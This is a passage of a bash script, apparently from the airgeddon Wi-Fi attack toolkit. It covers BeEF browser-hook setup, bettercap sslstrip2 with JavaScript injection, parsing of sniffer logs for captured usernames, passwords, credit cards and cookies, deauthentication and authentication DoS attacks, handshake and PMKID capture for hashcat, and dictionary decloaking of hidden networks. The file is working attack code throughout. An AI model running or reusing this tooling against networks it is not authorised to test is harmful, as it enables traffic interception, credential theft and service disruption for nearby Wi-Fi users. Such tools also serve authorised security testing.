	echo -e "        admin_ui:"
	echo -e "            enable: true"
	echo -e "            base_path: \"/ui\""
	} >> "${tmpdir}${beef_file}"
}

#Detects if your beef is Flexible Brainfuck interpreter instead of BeEF
function detect_fake_beef() {

	debug_print

	readarray -t BEEF_OUTPUT < <(timeout -s SIGTERM 0.5 beef -h 2> /dev/null)

	for item in "${BEEF_OUTPUT[@]}"; do
		if [[ ${item} =~ Brainfuck ]]; then
			fake_beef_found=1
			break
		fi
	done
}

#Search for beef path
function search_for_beef() {

	debug_print

	if [ "${beef_found}" -eq 0 ]; then
		for item in "${possible_beef_known_locations[@]}"; do
			if [ -f "${item}beef" ]; then
				beef_path="${item}"
				beef_found=1
				break
			fi
		done
	fi
}

#Prepare system to work with beef
function prepare_beef_start() {

	debug_print

	valid_possible_beef_path=0
	if [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 0 ]]; then
		language_strings "${language}" 405 "blue"
		ask_yesno 191 "yes"
		if [ "${yesno}" = "y" ]; then
			manual_beef_set
			search_for_beef
		fi

		if [[ "${beef_found}" -eq 1 ]] && [[ "${valid_possible_beef_path}" -eq 1 ]]; then
			fix_beef_executable "${manually_entered_beef_path}"
		fi

		if [ "${beef_found}" -eq 1 ]; then
			echo
			language_strings "${language}" 413 "yellow"
			language_strings "${language}" 115 "read"
		fi
	elif [[ "${beef_found}" -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 0 ]]; then
		fix_beef_executable "${beef_path}"
		echo
		language_strings "${language}" 413 "yellow"
		language_strings "${language}" 115 "read"
	elif [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 1 ]]; then
		language_strings "${language}" 405 "blue"
		ask_yesno 415 "yes"
		if [ "${yesno}" = "y" ]; then
			manual_beef_set
			search_for_beef
			if [[ "${beef_found}" -eq 1 ]] && [[ "${valid_possible_beef_path}" -eq 1 ]]; then
				rewrite_script_with_custom_beef "set" "${manually_entered_beef_path}"
				echo
				language_strings "${language}" 413 "yellow"
				language_strings "${language}" 115 "read"
			fi
		fi
	fi
}

#Set beef path manually
function manual_beef_set() {

	debug_print

	while [[ "${valid_possible_beef_path}" != "1" ]]; do
		echo
		language_strings "${language}" 402 "green"
		echo -en '> '
		manually_entered_beef_path=$(read -re _manually_entered_beef_path; echo -n "${_manually_entered_beef_path}")
		manually_entered_beef_path=$(fix_autocomplete_chars "${manually_entered_beef_path}")
		if [ -n "${manually_entered_beef_path}" ]; then
			lastcharmanually_entered_beef_path=${manually_entered_beef_path: -1}
			if [ "${lastcharmanually_entered_beef_path}" != "/" ]; then
				manually_entered_beef_path="${manually_entered_beef_path}/"
			fi

			firstcharmanually_entered_beef_path=${manually_entered_beef_path:0:1}
			if [ "${firstcharmanually_entered_beef_path}" != "/" ]; then
				language_strings "${language}" 404 "red"
			else
				if [ -d "${manually_entered_beef_path}" ]; then
					if [ -f "${manually_entered_beef_path}beef" ]; then
						if head "${manually_entered_beef_path}beef" -n 1 2> /dev/null | grep ruby > /dev/null; then
							possible_beef_known_locations+=("${manually_entered_beef_path}")
							valid_possible_beef_path=1
						else
							language_strings "${language}" 406 "red"
						fi
					else
						language_strings "${language}" 406 "red"
					fi
				else
					language_strings "${language}" 403 "red"
				fi
			fi
		fi
	done
}

#Fix for not found beef executable
function fix_beef_executable() {

	debug_print

	rm -rf "/usr/bin/beef" > /dev/null 2>&1
	{
	echo -e "#!/usr/bin/env bash\n"
	echo -e "cd ${1}"
	echo -e "./beef"
	} >> "/usr/bin/beef"
	chmod +x "/usr/bin/beef" > /dev/null 2>&1
	optional_tools[${optional_tools_names[17]}]=1

	rewrite_script_with_custom_beef "set" "${1}"
}

#Rewrite airgeddon script in a polymorphic way adding custom beef location to array to get persistence
function rewrite_script_with_custom_beef() {

	debug_print

	case ${1} in
		"set")
			sed -ri "s:(\s+|\t+)([\"0-9a-zA-Z/\-_ ]+)?\s?(#Custom BeEF location \(set=)([01])(\)):\1\"${2}\" \31\5:" "${scriptfolder}${scriptname}" 2> /dev/null
		;;
		"search")
			beef_custom_path_line=$(grep "#[C]ustom BeEF location (set=1)" < "${scriptfolder}${scriptname}" 2> /dev/null)
			if [ -n "${beef_custom_path_line}" ]; then
				[[ ${beef_custom_path_line} =~ \"(.*)\" ]] && beef_custom_path="${BASH_REMATCH[1]}"
			fi
		;;
	esac
}

#Start beef process as a service
function start_beef_service() {

	debug_print

	if ! service "${optional_tools_names[17]}" restart > /dev/null 2>&1; then
		systemctl restart "${optional_tools_names[17]}.service" > /dev/null 2>&1
	fi
}

#Launch beef browser exploitation framework
#shellcheck disable=SC2164
function launch_beef() {

	debug_print

	if [ "${beef_found}" -eq 0 ]; then
		start_beef_service
	fi

	recalculate_windows_sizes
	if [ "${beef_found}" -eq 1 ]; then
		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
		cp "${tmpdir}${beef_file}" "${beef_path}" > /dev/null 2>&1
		manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -geometry ${g4_middleright_window} -T \"BeEF\"" "cd ${beef_path} && ./beef -c \"${beef_file}\"" "BeEF"
		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
			cd "${beef_path}"
			get_tmux_process_id "./beef -c \"${beef_file}\""
			et_processes+=("${global_process_pid}")
			global_process_pid=""
		fi
	else
		manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -geometry ${g4_middleright_window} -T \"BeEF\"" "${optional_tools_names[17]}" "BeEF"
		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
			get_tmux_process_id "{optional_tools_names[18]}"
			et_processes+=("${global_process_pid}")
			global_process_pid=""
		fi
	fi

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	fi

	sleep 2
}

#Launch bettercap sniffer
#shellcheck disable=SC2001
function launch_bettercap_sniffing() {

	debug_print

	local bettercap_window_title

	recalculate_windows_sizes
	case ${et_mode} in
		"et_sniffing_sslstrip2")
			sniffing_scr_window_position=${g3_bottomright_window}
			bettercap_window_title="Sniffer+Bettercap-Sslstrip2"
		;;
		"et_sniffing_sslstrip2_beef")
			sniffing_scr_window_position=${g4_bottomright_window}
			bettercap_window_title="Sniffer+Bettercap-Sslstrip2/BeEF"
		;;
	esac

	if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}"; then
		set_bettercap_config

		bettercap_cmd="bettercap -iface ${interface} -no-history -caplet ${tmpdir}${bettercap_config_file}"

		if [ "${bettercap_log}" -eq 1 ]; then
			bettercap_cmd+=" | tee ${tmp_bettercaplog}"
		fi
	else
		if compare_floats_greater_or_equal "${bettercap_version}" "${minimum_bettercap_advanced_options}"; then
			bettercap_extra_cmd_options="--disable-parsers URL,HTTPS,DHCP --no-http-logs"
		fi

		if [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
			bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --dns-port ${bettercap_dns_port}"
		else
			bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
		fi

		if [ "${bettercap_log}" -eq 1 ]; then
			bettercap_cmd+=" -O \"${tmp_bettercaplog}\""
		fi
	fi

	manage_output "+j -bg \"#000000\" -fg \"#FFFF00\" -geometry ${sniffing_scr_window_position} -T \"${bettercap_window_title}\"" "${bettercap_cmd}" "${bettercap_window_title}"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		local bettercap_cmd_clean_for_pid_finding
		bettercap_cmd_clean_for_pid_finding=$(echo "${bettercap_cmd}" | sed 's/ |.*//')
		get_tmux_process_id "${bettercap_cmd_clean_for_pid_finding}"
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	else
		et_processes+=($!)
	fi
}

#Parse ettercap log searching for captured passwords
function parse_ettercap_log() {

	debug_print

	echo
	language_strings "${language}" 304 "blue"

	readarray -t CAPTUREDPASS < <(etterlog -L -p -i "${tmp_ettercaplog}.eci" 2> /dev/null | grep -E -i "USER:|PASS:")

	{
	echo ""
	date +%Y-%m-%d
	echo "${et_misc_texts[${language},8]}"
	echo ""
	echo "BSSID: ${bssid}"
	echo "${et_misc_texts[${language},1]}: ${channel}"
	echo "ESSID: ${essid}"
	echo ""
	echo "---------------"
	echo ""
	} >> "${tmpdir}parsed_file"

	pass_counter=0
	for cpass in "${CAPTUREDPASS[@]}"; do
		echo "${cpass}" >> "${tmpdir}parsed_file"
		pass_counter=$((pass_counter + 1))
	done

	add_contributing_footer_to_file "${tmpdir}parsed_file"

	if [ "${pass_counter}" -eq 0 ]; then
		language_strings "${language}" 305 "yellow"
	else
		language_strings "${language}" 306 "blue"
		cp "${tmpdir}parsed_file" "${ettercap_logpath}" > /dev/null 2>&1
	fi

	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
	language_strings "${language}" 115 "read"
}

#Parse bettercap log searching for captured passwords
function parse_bettercap_log() {

	debug_print

	echo
	language_strings "${language}" 304 "blue"

	if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}"; then
		sed -Ei 's/\x1b\[[0-9;]*m.+\x1b\[[0-9;]K//g' "${tmp_bettercaplog}" 2> /dev/null
		sed -Ei 's/\x1b\[[0-9;]*m|\x1b\[J|\x1b\[[0-9;]K|\x8|\xd//g' "${tmp_bettercaplog}" 2> /dev/null
		sed -Ei 's/.*»//g' "${tmp_bettercaplog}" 2> /dev/null
		sed -Ei 's/^[[:blank:]]*//g' "${tmp_bettercaplog}" 2> /dev/null
		sed -Ei '/^$/d' "${tmp_bettercaplog}" 2> /dev/null
	fi

	local regexp='USER|UNAME|PASS|CREDITCARD|COOKIE|PWD|USUARIO|CONTRASE|CORREO|MAIL|NET.SNIFF.HTTP.REQUEST.*POST|HTTP\].*POST'
	local regexp2='USER-AGENT|COOKIES|BEEFHOOK'
	readarray -t BETTERCAPLOG < <(cat < "${tmp_bettercaplog}" 2> /dev/null | grep -E -i "${regexp}" | grep -E -vi "${regexp2}")

	{
	echo ""
	date +%Y-%m-%d
	echo "${et_misc_texts[${language},8]}"
	echo ""
	echo "BSSID: ${bssid}"
	echo "${et_misc_texts[${language},1]}: ${channel}"
	echo "ESSID: ${essid}"
	echo ""
	echo "---------------"
	echo ""
	} >> "${tmpdir}parsed_file"

	pass_counter=0
	captured_cookies=()
	for cpass in "${BETTERCAPLOG[@]}"; do
		if [[ ${cpass^^} =~ ${regexp^^} ]]; then
			repeated_cookie=0
			for item in "${captured_cookies[@]}"; do
				if [ "${item}" = "${cpass}" ]; then
					repeated_cookie=1
					break
				fi
			done
			if [ "${repeated_cookie}" -eq 0 ]; then
				captured_cookies+=("${cpass}")
				echo "${cpass}" >> "${tmpdir}parsed_file"
				pass_counter=$((pass_counter + 1))
			fi
		else
			echo "${cpass}" >> "${tmpdir}parsed_file"
			pass_counter=$((pass_counter + 1))
		fi
	done

	add_contributing_footer_to_file "${tmpdir}parsed_file"

	if [ "${pass_counter}" -eq 0 ]; then
		language_strings "${language}" 305 "yellow"
	else
		language_strings "${language}" 399 "blue"
		cp "${tmpdir}parsed_file" "${bettercap_logpath}" > /dev/null 2>&1
	fi

	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
	language_strings "${language}" 115 "read"
}

#Write on a file the id of the Evil Twin attack processes
function write_et_processes() {

	debug_print

	rm -rf "${tmpdir}${et_processesfile}" > /dev/null 2>&1

	for item in "${et_processes[@]}"; do
		echo "${item}" >> "${tmpdir}${et_processesfile}"
	done

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		for item in "${dos_pursuit_mode_pids[@]}"; do
			echo "${item}" >> "${tmpdir}${et_processesfile}"
		done
	fi
}

#Kill a given PID and all its subprocesses recursively
	function kill_pid_and_children_recursive() {

	debug_print

	local parent_pid=""
	local child_pids=""

	parent_pid="${1}"
	child_pids=$(pgrep -P "${parent_pid}" 2> /dev/null)

	for child_pid in ${child_pids}; do
		kill_pid_and_children_recursive "${child_pid}"
	done
	if [ -n "${child_pids}" ]; then
		pkill -P "${parent_pid}" &> /dev/null
	fi

	kill "${parent_pid}" &> /dev/null
	wait "${parent_pid}" 2> /dev/null
	}

#Kill the Evil Twin and Enterprise processes
function kill_et_windows() {

	debug_print

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		kill_dos_pursuit_mode_processes
	fi

	for item in "${et_processes[@]}"; do
		kill_pid_and_children_recursive "${item}"
	done

	if [ -n "${enterprise_mode}" ]; then
		kill "${enterprise_process_control_window}" &> /dev/null
	else
		kill "${et_process_control_window}" &> /dev/null
	fi

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		kill_tmux_windows
	fi
}

#Kill DoS pursuit mode processes
function kill_dos_pursuit_mode_processes() {

	debug_print

	for item in "${dos_pursuit_mode_pids[@]}"; do
		kill_pid_and_children_recursive "${item}"
	done

	if ! stty sane > /dev/null 2>&1; then
		reset > /dev/null 2>&1
	fi
	dos_pursuit_mode_pids=()
	sleep 1
}

#Set current channel reading it from file
function recover_current_channel() {

	debug_print

	local recovered_channel
	recovered_channel=$(cat "${tmpdir}${channelfile}" 2> /dev/null)
	if [ -n "${recovered_channel}" ]; then
		channel="${recovered_channel}"
	fi
}

#Convert capture file to hashcat format
function convert_cap_to_hashcat_format() {

	debug_print

	rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
	if [ "${hccapx_needed}" -eq 0 ]; then
		echo "1" | timeout -s SIGTERM 3 aircrack-ng "${enteredpath}" -J "${tmpdir}${hashcat_tmp_simple_name_file}" -b "${bssid}" > /dev/null 2>&1
		return 0
	else
		if [ "${hcx_conversion_needed}" -eq 1 ]; then
			if hash hcxpcapngtool 2> /dev/null; then
				hcxpcapngtool -o "${tmpdir}${hashcat_tmp_file}" "${enteredpath}" > /dev/null 2>&1
				return 0
			else
				echo
				language_strings "${language}" 703 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		else
			hccapx_converter_found=0
			if hash ${hccapx_tool} 2> /dev/null; then
				hccapx_converter_found=1
				hccapx_converter_path="${hccapx_tool}"
			else
				for item in "${possible_hccapx_converter_known_locations[@]}"; do
					if [ -f "${item}" ]; then
						hccapx_converter_found=1
						hccapx_converter_path="${item}"
						break
					fi
				done
			fi

			if [ "${hccapx_converter_found}" -eq 1 ]; then
				hashcat_tmp_file="${hashcat_tmp_simple_name_file}.hccapx"
				"${hccapx_converter_path}" "${enteredpath}" "${tmpdir}${hashcat_tmp_file}" > /dev/null 2>&1
				return 0
			else
				echo
				language_strings "${language}" 436 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		fi
	fi
}

#Handshake/PMKID/Decloaking tools menu
function handshake_pmkid_decloaking_tools_menu() {

	debug_print

	clear
	language_strings "${language}" 120 "title"
	current_menu="handshake_pmkid_decloaking_tools_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 124 "separator"
	language_strings "${language}" 663 pmkid_dependencies[@]
	language_strings "${language}" 121
	language_strings "${language}" 122 clean_handshake_dependencies[@]
	language_strings "${language}" 727 "separator"
	language_strings "${language}" 725
	language_strings "${language}" 726 mdk_attack_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " handshake_option
	case ${handshake_option} in
		0)
			return
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			explore_for_targets_option
		;;
		5)
			if contains_element "${handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hcxdumptool_version
				if compare_floats_greater_or_equal "${hcxdumptool_version}" "${minimum_hcxdumptool_bpf_version}"; then
					if hash tcpdump 2> /dev/null; then
						echo
						language_strings "${language}" 716 "yellow"
						capture_pmkid_handshake "pmkid"
					else
						echo
						language_strings "${language}" 715 "red"
						language_strings "${language}" 115 "read"
					fi
				else
					capture_pmkid_handshake "pmkid"
				fi
			fi
		;;
		6)
			capture_pmkid_handshake "handshake"
		;;
		7)
			if contains_element "${handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				clean_handshake_file_option
			fi
		;;
		8)
			decloak_prequisites "deauth"
		;;
		9)
			if contains_element "${handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				decloak_prequisites "dictionary"
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	handshake_pmkid_decloaking_tools_menu
}

#Execute the cleaning of a Handshake file
function exec_clean_handshake_file() {

	debug_print

	echo
	if ! check_valid_file_to_clean "${filetoclean}"; then
		language_strings "${language}" 159 "yellow"
	else
		wpaclean "${filetoclean}" "${filetoclean}" > /dev/null 2>&1
		language_strings "${language}" 153 "yellow"
	fi
	language_strings "${language}" 115 "read"
}

#Validate and ask for the parameters used to clean a Handshake file
function clean_handshake_file_option() {

	debug_print

	echo
	readpath=0

	if [ -z "${enteredpath}" ]; then
		language_strings "${language}" 150 "blue"
		readpath=1
	else
		language_strings "${language}" 151 "blue"
		ask_yesno 152 "yes"
		if [ "${yesno}" = "y" ]; then
			filetoclean="${enteredpath}"
		else
			readpath=1
		fi
	fi

	if [ "${readpath}" -eq 1 ]; then
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "cleanhandshake"
		done
	fi

	exec_clean_handshake_file
}

#DoS attacks menu
function dos_attacks_menu() {

	debug_print

	clear
	language_strings "${language}" 102 "title"
	current_menu="dos_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 50 "separator"
	language_strings "${language}" 51 mdk_attack_dependencies[@]
	language_strings "${language}" 52 aireplay_attack_dependencies[@]
	language_strings "${language}" 63 mdk_attack_dependencies[@]
	language_strings "${language}" 54 "separator"
	language_strings "${language}" 62 mdk_attack_dependencies[@]
	language_strings "${language}" 53 mdk_attack_dependencies[@]
	language_strings "${language}" 64 mdk_attack_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " dos_option
	case ${dos_option} in
		0)
			return
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			explore_for_targets_option
		;;
		5)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				mdk_deauth_option
			fi
		;;
		6)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				aireplay_deauth_option
			fi
		;;
		7)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				auth_dos_option
			fi
		;;
		8)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				beacon_flood_option
			fi
		;;
		9)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wds_confusion_option
			fi
		;;
		10)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				michael_shutdown_option
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	dos_attacks_menu
}

#Capture Handshake on Evil Twin attack
function capture_handshake_evil_twin() {

	debug_print

	if ! validate_network_encryption_type "WPA"; then
		return 1
	fi

	ask_timeout "capture_handshake_decloak"
	capture_handshake_window

	case ${et_dos_attack} in
		"${mdk_command}")
			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
			echo "${bssid}" > "${tmpdir}bl.txt"
			recalculate_windows_sizes
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
				processidattack="${global_process_pid}"
				global_process_pid=""
			fi
			sleeptimeattack=12
		;;
		"Aireplay")
			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
			recalculate_windows_sizes
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}"
				processidattack="${global_process_pid}"
				global_process_pid=""
			fi
			sleeptimeattack=12
		;;
		"Auth DoS")
			recalculate_windows_sizes
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface} a -a ${bssid} -m"
				processidattack="${global_process_pid}"
				global_process_pid=""
			fi
			sleeptimeattack=16
		;;
	esac

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		processidattack=$!
		sleep "${sleeptimeattack}" && kill "${processidattack}" &> /dev/null
	else
		sleep "${sleeptimeattack}" && kill "${processidattack}" && kill_tmux_windows "Capturing Handshake" &> /dev/null
	fi

	handshake_capture_check

	check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "showing_msgs_capturing" "also_pmkid"
	case "$?" in
		"0")
			handshakepath="${default_save_path}"
			handshakefilename="handshake-${bssid}.cap"
			handshakepath="${handshakepath}${handshakefilename}"

			echo
			language_strings "${language}" 162 "yellow"
			validpath=1
			while [[ "${validpath}" != "0" ]]; do
				read_path "writeethandshake"
			done

			cp "${tmpdir}${standardhandshake_filename}" "${et_handshake}"
			echo
			language_strings "${language}" 324 "blue"
			language_strings "${language}" 115 "read"
			return 0
		;;
		"1")
			echo
			language_strings "${language}" 146 "red"
			language_strings "${language}" 115 "read"
			return 2
		;;
		"2")
			return 2
		;;
	esac
}

#Decloak ESSID by deauthentication or by dictionary on Handshake/PMKID/Decloak tools
function decloak_prequisites() {

	debug_print

	if [[ "${essid}" != "(Hidden Network)" ]] || [[ -z ${channel} ]]; then
		echo
		language_strings "${language}" 731 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if [ "${channel}" -gt 14 ]; then
		if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
			echo
			language_strings "${language}" 515 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	fi

	echo
	language_strings "${language}" 730 "yellow"
	language_strings "${language}" 115 "read"

	if [ "${1}" = "deauth" ]; then
		dos_handshake_decloaking_menu "decloak"
	else
		manage_asking_for_dictionary_file

		echo
		language_strings "${language}" 737 "blue"
		language_strings "${language}" 115 "read"

		exec_decloak_by_dictionary
	fi
}

#Execute mdk decloak by dictionary
function exec_decloak_by_dictionary() {

	debug_print

	iw "${interface}" set channel "${channel}" > /dev/null 2>&1

	local unbuffer
	unbuffer=""
	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
		unbuffer="stdbuf -i0 -o0 -e0 "
	fi

	rm -rf "${tmpdir}decloak.log" > /dev/null 2>&1
	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFFF00\" -geometry ${g1_topright_window} -T \"decloack by dictionary\"" "${unbuffer}${mdk_command} ${interface} p -t ${bssid} -f ${DICTIONARY} | tee ${tmpdir}decloak.log ${colorize}" "decloack by dictionary" "active"
	wait_for_process "${mdk_command} ${interface} p -t ${bssid} -f ${DICTIONARY}" "decloack by dictionary"

	if check_essid_in_mdk_decloak_log; then
		echo
		language_strings "${language}" 162 "yellow"
		echo
		language_strings "${language}" 736 "blue"
		language_strings "${language}" 115 "read"
	else
		echo
		language_strings "${language}" 738 "red"
		language_strings "${language}" 115 "read"
	fi
}

#Capture Handshake on Handshake/PMKID tools
function capture_pmkid_handshake() {

	debug_print

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "${essid}" = "(Hidden Network)" ]]; then
		echo
		language_strings "${language}" 125 "yellow"
		language_strings "${language}" 115 "read"
		if ! explore_for_targets_option "WPA"; then
			return 1
		fi
	fi

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if [ "${channel}" -gt 14 ]; then
		if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
			echo
			language_strings "${language}" 515 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	fi

	if ! validate_network_encryption_type "WPA"; then
		return 1
	fi

	echo
	language_strings "${language}" 126 "yellow"
	language_strings "${language}" 115 "read"

	if [ "${1}" = "handshake" ]; then
		dos_handshake_decloaking_menu "${1}"
	else
		launch_pmkid_capture
	fi
}

#Check if file exists
function check_file_exists() {

	debug_print

	if [[ ! -f $(readlink -f "${1}") ]] || [[ -z "${1}" ]]; then
		language_strings "${language}" 161 "red"
		return 1
	fi
	return 0
}

#Validate path
function validate_path() {

	debug_print

	lastcharmanualpath=${1: -1}

	if [[ "${2}" = "enterprisepot" ]] || [[ "${2}" = "certificates" ]]; then
		dirname=$(dirname "${1}")

		if [ -d "${dirname}" ]; then
			if ! check_write_permissions "${dirname}"; then
				language_strings "${language}" 157 "red"
				return 1
			fi
		else
			if ! dir_permission_check "${1}"; then
				language_strings "${language}" 526 "red"
				return 1
			fi
		fi

		if [ "${lastcharmanualpath}" != "/" ]; then
			pathname="${1}/"
		fi
	else
		dirname=${1%/*}

		if [[ ! -d "${dirname}" ]] || [[ "${dirname}" = "." ]]; then
			language_strings "${language}" 156 "red"
			return 1
		fi

		if ! check_write_permissions "${dirname}"; then
			language_strings "${language}" 157 "red"
			return 1
		fi
	fi

	if [[ "${lastcharmanualpath}" = "/" ]] || [[ -d "${1}" ]] || [[ "${2}" = "enterprisepot" ]] || [[ "${2}" = "certificates" ]]; then
		if [ "${lastcharmanualpath}" != "/" ]; then
			pathname="${1}/"
		else
			pathname="${1}"
		fi

		case ${2} in
			"handshake")
				enteredpath="${pathname}${standardhandshake_filename}"
				suggested_filename="${standardhandshake_filename}"
			;;
			"pmkid")
				enteredpath="${pathname}${standardpmkid_filename}"
				suggested_filename="${standardpmkid_filename}"
			;;
			"pmkidcap")
				enteredpath="${pathname}${standardpmkidcap_filename}"
				suggested_filename="${standardpmkidcap_filename}"
			;;
			"aircrackpot")
				suggested_filename="${aircrackpot_filename}"
				aircrackpotenteredpath+="${aircrackpot_filename}"
			;;
			"jtrpot")
				suggested_filename="${jtrpot_filename}"
				jtrpotenteredpath+="${jtrpot_filename}"
			;;
			"hashcatpot")
				suggested_filename="${hashcatpot_filename}"
				potenteredpath+="${hashcatpot_filename}"
			;;
			"asleappot")
				suggested_filename="${asleappot_filename}"
				asleapenteredpath+="${asleappot_filename}"
			;;
			"ettercaplog")
				suggested_filename="${default_ettercaplogfilename}"
				ettercap_logpath="${ettercap_logpath}${default_ettercaplogfilename}"
			;;
			"bettercaplog")
				suggested_filename="${default_bettercaplogfilename}"
				bettercap_logpath="${bettercap_logpath}${default_bettercaplogfilename}"
			;;
			"writeethandshake")
				et_handshake="${pathname}${standardhandshake_filename}"
				suggested_filename="${standardhandshake_filename}"
			;;
			"et_captive_portallog")
				suggested_filename="${default_et_captive_portallogfilename}"
				et_captive_portal_logpath+="${default_et_captive_portallogfilename}"
			;;
			"wpspot")
				suggested_filename="${wpspot_filename}"
				wpspotenteredpath+="${wpspot_filename}"
			;;
			"weppot")
				suggested_filename="${weppot_filename}"
				weppotenteredpath+="${weppot_filename}"
			;;
			"enterprisepot")
				enterprise_potpath="${pathname}"
				enterprise_basepath=$(dirname "${enterprise_potpath}")

				if [ "${enterprise_basepath}" != "." ]; then
					enterprise_dirname=$(basename "${enterprise_potpath}")
				fi

				if [ "${enterprise_basepath}" != "/" ]; then
					enterprise_basepath+="/"
				fi

				if [ "${enterprise_dirname}" != "${enterprisepot_suggested_dirname}" ]; then
					enterprise_completepath="${enterprise_potpath}${enterprisepot_suggested_dirname}/"
				else
					enterprise_completepath="${enterprise_potpath}"
					if [ "${enterprise_potpath: -1}" != "/" ]; then
						enterprise_completepath+="/"
					fi
				fi

				echo
				language_strings "${language}" 158 "yellow"
				return 0
			;;
			"certificates")
				enterprisecertspath="${pathname}"
				enterprisecerts_basepath=$(dirname "${enterprisecertspath}")

				if [ "${enterprisecerts_basepath}" != "/" ]; then
					enterprisecerts_basepath+="/"
				fi

				enterprisecerts_completepath="${enterprisecertspath}"
				if [ "${enterprisecertspath: -1}" != "/" ]; then
					enterprisecerts_completepath+="/"
				fi

				echo
				language_strings "${language}" 158 "yellow"
				return 0
			;;
		esac

		echo
		language_strings "${language}" 155 "yellow"
		return 0
	fi

	echo
	language_strings "${language}" 158 "yellow"
	return 0
}

#It checks for write permissions of a directory recursively
function dir_permission_check() {

	debug_print

	if [ -e "${1}" ]; then
